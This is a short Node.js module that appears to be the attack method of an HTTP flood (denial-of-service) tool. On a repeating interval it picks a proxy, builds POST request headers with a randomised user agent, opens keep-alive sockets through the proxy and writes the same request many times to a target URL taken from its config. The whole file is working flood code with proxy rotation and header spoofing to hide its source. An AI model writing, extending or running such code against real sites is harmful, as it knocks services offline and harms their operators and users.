const net = require('net')
const header = require('../header')
const proxy = require('../proxy')
const ua = require('../ua')

module.exports = {
    exec (config) {
        setInterval(() => {
            const proxyer = proxy.make()
            const data = header.make({
                url: config.url,
                host: config.urls.host,
                ua: ua.make(),
                post: config.post,
                post_length: config.post.length 
            })
            const socket = net.connect(proxyer[1], proxyer[0]);
            socket.setKeepAlive(true, config.timeout)
            socket.setTimeout(config.timeout)
            socket.once('error', () => {
                //console.log('Error : ' + proxyer[0] + ":" + proxyer[1])
            });
            socket.once('disconnect', () => {
                console.log('Disconnect')
            });
            socket.once('data', (data) => {
                //console.log('Connected : ' + proxyer[0] + ":" + proxyer[1])
                console.log(data.toString())
            });

            for (let j = 0; j < config.launch; j++) {
                socket.write(data);
            }
        
            socket.on('data', () => {
                setTimeout(() => {
                    socket.destroy()
                    delete socket
                }, config.time);
            })
        }, config.speed)
    }
}